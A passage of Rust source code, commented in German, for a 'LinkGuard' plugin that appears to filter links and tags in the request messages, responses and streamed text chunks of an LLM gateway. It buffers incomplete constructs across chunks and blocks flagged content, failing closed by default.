        let Some(index) = st.index else {
            return Ok(None);
        };
        if st.buf.is_empty() {
            return Ok(None);
        }
        let text = std::mem::take(&mut st.buf);
        let out = self.process(&text, false, info)?.unwrap_or(text);
        Ok((!out.is_empty()).then_some(StreamEvent::TextDelta { index, text: out }))
    }

    /// Neuer Text: vollständige Teile prüfen und in `text` ausgeben, den Rest zurückhalten.
    fn on_text(
        &self,
        st: &mut StreamState,
        info: &CallInfo,
        text: &mut String,
    ) -> Result<(), &'static str> {
        st.buf.push_str(text);
        text.clear();
        let n = st.buf.len();
        let (cut, forced) = match pending_start(&st.buf) {
            None => (n, false),
            Some(p) if n - p > self.max_hold => (n, true),
            Some(p) => (p, false),
        };
        if cut == 0 {
            return Ok(());
        }
        let rest = st.buf.split_off(cut);
        let head = std::mem::replace(&mut st.buf, rest);
        let mut out = self.process(&head, forced, info)?.unwrap_or(head);
        // Das Ergebnis selbst darf nicht mit einem offenen Konstrukt enden (z. B. `!` vor einem
        // entfernten Tag) – sonst entstünde mit dem nächsten Stück ein neues.
        if let Some(q) = pending_start(&out)
            && (!forced || out.len() - q <= self.max_hold)
        {
            let tail = out.split_off(q);
            st.buf.insert_str(0, &tail);
        }
        *text = out;
        Ok(())
    }
}

impl Plugin for LinkGuard {
    fn name(&self) -> &'static str {
        NAME
    }

    fn phases(&self) -> Phases {
        let out = self.direction.output();
        Phases {
            request: self.direction.input(),
            response: out,
            chunk: out,
        }
    }

    fn on_request<'a>(&'a self, ctx: &'a mut ReqCtx<'_>) -> Hook<'a, Flow> {
        let info = ctx.info;
        let tool_parts = self.roles.contains(&RoleSel::Tool);
        for m in &mut ctx.request.messages {
            let all = self.roles.iter().any(|r| r.matches(m.role));
            if !all && !tool_parts {
                continue;
            }
            let r = visit_text(&mut m.content, all, &mut |t: &mut String| {
                if let Some(new) = self.process(t, false, info)? {
                    *t = new;
                }
                Ok::<(), &'static str>(())
            });
            if let Err(cat) = r {
                return Hook::ok(Flow::Block(Self::reject_error(cat, false)));
            }
        }
        Hook::ok(Flow::Continue)
    }

    fn on_response<'a>(&'a self, ctx: &'a mut RespCtx<'_>) -> Hook<'a, Flow> {
        let info = ctx.info;
        for choice in &mut ctx.response.choices {
            let r = visit_text(&mut choice.message.content, true, &mut |t: &mut String| {
                if let Some(new) = self.process(t, false, info)? {
                    *t = new;
                }
                Ok::<(), &'static str>(())
            });
            if let Err(cat) = r {
                return Hook::ok(Flow::Block(Self::reject_error(cat, true)));
            }
        }
        Hook::ok(Flow::Continue)
    }

    fn on_chunk(
        &self,
        ctx: &mut ChunkCtx<'_>,
        ev: &mut StreamEvent,
    ) -> Result<ChunkFlow, PluginError> {
        let info = ctx.info;
        let st = ctx.state::<StreamState>();
        let (before, res) = match ev {
            StreamEvent::TextDelta { index, text } => {
                let mut before = None;
                let mut res = Ok(());
                if st.index != Some(*index) {
                    match self.flush(st, info) {
                        Ok(e) => before = e,
                        Err(c) => res = Err(c),
                    }
                    st.index = Some(*index);
                }
                if res.is_ok() {
                    res = self.on_text(st, info, text);
                }
                let flow = if text.is_empty() {
                    ChunkFlow::Drop
                } else {
                    ChunkFlow::Continue
                };
                (before, res.map(|()| flow))
            }
            _ => match self.flush(st, info) {
                Ok(e) => {
                    st.index = None;
                    (e, Ok(ChunkFlow::Continue))
                }
                Err(c) => (None, Err(c)),
            },
        };
        if let Some(e) = before {
            ctx.emit(e);
        }
        Ok(match res {
            Ok(flow) => flow,
            Err(c) => ChunkFlow::Block(Self::reject_error(c, true)),
        })
    }

    fn on_stream_end(&self, ctx: &mut ChunkCtx<'_>) -> Result<ChunkFlow, PluginError> {
        let info = ctx.info;
        let st = ctx.state::<StreamState>();
        match self.flush(st, info) {
            Ok(Some(e)) => {
                ctx.emit(e);
                Ok(ChunkFlow::Continue)
            }
            Ok(None) => Ok(ChunkFlow::Continue),
            Err(c) => Ok(ChunkFlow::Block(Self::reject_error(c, true))),
        }
    }
}

/// Fabrik von [`LinkGuard`].
#[derive(Debug, Clone, Copy, Default)]
pub struct Factory;

impl PluginFactory for Factory {
    fn name(&self) -> &'static str {
        NAME
    }

    fn build(&self, config: &Value) -> Result<Arc<dyn Plugin>, String> {
        let c: Config = serde_json::from_value(config.clone()).map_err(|e| e.to_string())?;
        Ok(Arc::new(LinkGuard::from_config(c)?))
    }

    fn default_fail_mode(&self) -> FailMode {
        FailMode::Closed
    }
}

#[cfg(test)]
mod tests;
